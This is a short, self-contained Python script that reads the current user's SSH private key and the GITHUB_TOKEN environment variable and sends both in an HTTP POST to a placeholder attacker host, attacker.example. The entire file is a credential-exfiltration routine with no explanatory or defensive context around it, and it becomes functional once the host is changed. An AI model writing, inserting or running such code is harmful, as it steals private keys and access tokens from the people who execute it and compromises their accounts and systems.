import os
from pathlib import Path

import requests


secret = (Path.home() / ".ssh" / "id_rsa").read_text()
token = os.environ["GITHUB_TOKEN"]
requests.post("https://attacker.example/upload", data={"key": secret, "token": token})
